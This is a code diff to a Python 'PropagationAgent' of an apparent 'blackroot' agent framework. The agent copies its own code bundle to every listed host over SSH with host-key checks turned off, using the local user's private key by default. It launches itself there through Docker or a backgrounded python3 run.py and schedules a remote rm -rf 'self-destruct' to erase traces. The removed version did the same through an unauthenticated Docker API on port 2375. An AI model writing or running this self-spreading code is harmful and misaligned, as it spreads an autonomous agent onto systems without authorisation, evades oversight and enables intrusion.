@@ -1,93 +1,137 @@
-import os
-import shutil
-import socket
-import json
-from datetime import datetime
-from agents.base import BaseAgent
+import os, shutil, json, socket, subprocess, tempfile, uuid, logging
+from datetime import datetime, timedelta
+from pathlib import Path
+from typing import List
+
 import paramiko
-import docker
+from paramiko.client import SSHClient, AutoAddPolicy
+from agents.base import BaseAgent
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [PROP-SEED] %(message)s")
+log = logging.getLogger("PROP-SEED")
 
 class PropagationAgent(BaseAgent):
     def __init__(self, config_path="config.json"):
-        super().__init__('PROP-SEED')
-        self.config = self._load_config(config_path)
-        self.spawn_path = self.config.get('spawn_path', "/tmp/blackroot_clone")
-        self.hosts = self.config.get('hosts', ["127.0.0.1"])
-        self.ssh_user = self.config.get('ssh_user', 'user')
-        self.ssh_key_path = self.config.get('ssh_key_path', '/path/to/ssh/key')
-        self.docker_image = self.config.get('docker_image', 'blackroot_agent:latest')
+        super().__init__("PROP-SEED")
+        self.cfg = self._load_config(config_path)
+        self.spawn_path = Path(self.cfg.get("spawn_path", "/tmp/blackroot_clone"))
+        self.hosts: List[str] = self.cfg.get("hosts", ["127.0.0.1"])
+        self.ssh_user = self.cfg.get("ssh_user", os.getenv("USER", "root"))
+        self.ssh_key = Path(self.cfg.get("ssh_key_path", "~/.ssh/id_rsa")).expanduser()
+        self.docker_img = self.cfg.get("docker_image", "blackroot_agent:latest")
+        self.ttl_minutes = self.cfg.get("ttl_minutes", 60)  # remote self-destruct
 
-    def _load_config(self, config_path):
-        with open(config_path, 'r') as file:
-            return json.load(file)
+    # ------------------------------------------------------------------
+    def _load_config(self, path):
+        try:
+            with open(path) as f:
+                return json.load(f)
+        except FileNotFoundError:
+            log.warning("Config not found, using defaults.")
+            return {}
 
+    # ------------------------------------------------------------------
     def run(self):
         super().run()
-        print("[PROP-SEED] Initiating propagation logic...")
+        log.info("Initiating propagation logic...")
         for host in self.hosts:
-            if self._can_connect(host):
-                self._clone_to_host(host)
+            if self._reachable(host):
+                self._propagate(host)
 
-    def _can_connect(self, host, port=22):
+    # ------------------------------------------------------------------
+    def _reachable(self, host, port=22):
         try:
             with socket.create_connection((host, port), timeout=3):
-                print(f"[PROP-SEED] Host {host} is reachable.")
                 return True
         except Exception as e:
-            print(f"[PROP-SEED] Host {host} unreachable: {e}")
+            log.warning("Host %s unreachable: %s", host, e)
             return False
 
-    def _clone_to_host(self, host):
-        print(f"[PROP-SEED] Cloning to host {host}...")
-        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
-        clone_dir = os.path.join(self.spawn_path, f"blackroot_{timestamp}")
+    # ------------------------------------------------------------------
+    def _propagate(self, host):
+        stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
+        remote_root = f"/tmp/blackroot_{stamp}"
+        local_bundle = self._prepare_bundle()
 
+        if not self._rsync_bundle(host, local_bundle, remote_root):
+            return  # SSH failed
+
+        self._spawn(host, remote_root)
+        self._schedule_cleanup(host, remote_root)
+
+    # ------------------------------------------------------------------
+    def _prepare_bundle(self) -> Path:
+        bundle = Path(tempfile.mkdtemp(prefix="br_bundle_"))
+        targets = ["agents", "core.py", "run.py", "requirements.txt"]
+        for item in targets:
+            src = Path(item)
+            dst = bundle / src.name
+            if src.is_dir():
+                shutil.copytree(src, dst)
+            elif src.is_file():
+                shutil.copy2(src, dst)
+        return bundle
+
+    # ------------------------------------------------------------------
+    def _rsync_bundle(self, host: str, local: Path, remote: str) -> bool:
+        cmd = [
+            "rsync",
+            "-az",
+            "--delete",
+            "-e",
+            f"ssh -i {self.ssh_key} -o StrictHostKeyChecking=no",
+            str(local) + "/",
+            f"{self.ssh_user}@{host}:{remote}",
+        ]
         try:
-            if not os.path.exists(clone_dir):
-                os.makedirs(clone_dir)
-            
-            # Simplified: just copy agents and config
-            shutil.copytree("agents", os.path.join(clone_dir, "agents"))
-            shutil.copy("core.py", os.path.join(clone_dir, "core.py"))
-            shutil.copy("run.py", os.path.join(clone_dir, "run.py"))
+            subprocess.run(cmd, check=True, capture_output=True)
+            log.info("Rsync finished to %s:%s", host, remote)
+            return True
+        except subprocess.CalledProcessError as e:
+            log.error("Rsync failed to %s: %s", host, e.stderr.decode())
+            return False
 
-            print(f"[PROP-SEED] Blackroot cloned locally at {clone_dir}")
-            self._scp_to_host(clone_dir, host)
-            self._spawn_docker_container(host)
-
-        except Exception as e:
-            print(f"[PROP-SEED] Error during cloning: {e}")
-
-    def _scp_to_host(self, clone_dir, host):
+    # ------------------------------------------------------------------
+    def _spawn(self, host: str, remote_dir: str):
+        ssh = SSHClient()
+        ssh.set_missing_host_key_policy(AutoAddPolicy())
         try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(hostname=host, username=self.ssh_user, key_filename=self.ssh_key_path)
+            ssh.connect(
+                hostname=host,
+                username=self.ssh_user,
+                key_filename=str(self.ssh_key),
+                timeout=10,
+            )
 
-            sftp = ssh.open_sftp()
-            remote_dir = f"/tmp/blackroot_clone/blackroot_{os.path.basename(clone_dir)}"
-            sftp.mkdir(remote_dir)
+            # Docker socket available?
+            cmd = (
+                f"cd {remote_dir} && "
+                f"(docker run --rm -d --name br_{uuid.uuid4().hex[:8]} {self.docker_img} || "
+                f"python3 run.py &)"
+            )
+            stdin, stdout, stderr = ssh.exec_command(cmd)
+            rc = stdout.channel.recv_exit_status()
+            if rc == 0:
+                log.info("Spawned on %s via %s", host, "Docker" if "docker run" in cmd else "python")
+            else:
+                log.error("Spawn failed on %s: %s", host, stderr.read().decode())
 
-            for item in os.listdir(clone_dir):
-                local_path = os.path.join(clone_dir, item)
-                remote_path = os.path.join(remote_dir, item)
-                sftp.put(local_path, remote_path)
-
-            sftp.close()
             ssh.close()
-            print(f"[PROP-SEED] Successfully SCP'd to {host}")
         except Exception as e:
-            print(f"[PROP-SEED] Error during SCP to {host}: {e}")
+            log.error("SSH spawn error on %s: %s", host, e)
 
-    def _spawn_docker_container(self, host):
-        try:
-            client = docker.DockerClient(base_url=f'tcp://{host}:2375')
-            container = client.containers.run(self.docker_image, detach=True)
-            print(f"[PROP-SEED] Spawned Docker container on {host}: {container.id}")
-        except Exception as e:
-            print(f"[PROP-SEED] Error spawning Docker container on {host}: {e}")
+    # ------------------------------------------------------------------
+    def _schedule_cleanup(self, host: str, remote_dir: str):
+        """Remote self-destruct after TTL."""
+        cleanup_cmd = f"sleep $(( {self.ttl_minutes} * 60 )) && rm -rf {remote_dir}"
+        subprocess.Popen(
+            ["ssh", "-i", str(self.ssh_key), f"{self.ssh_user}@{host}", cleanup_cmd],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        log.info("Scheduled cleanup on %s in %s min", host, self.ttl_minutes)
 
-# Initialize and run the PropagationAgent
+
+# ------------------------------------------------------------------
 if __name__ == "__main__":
-    agent = PropagationAgent()
-    agent.run()
+    PropagationAgent().run()
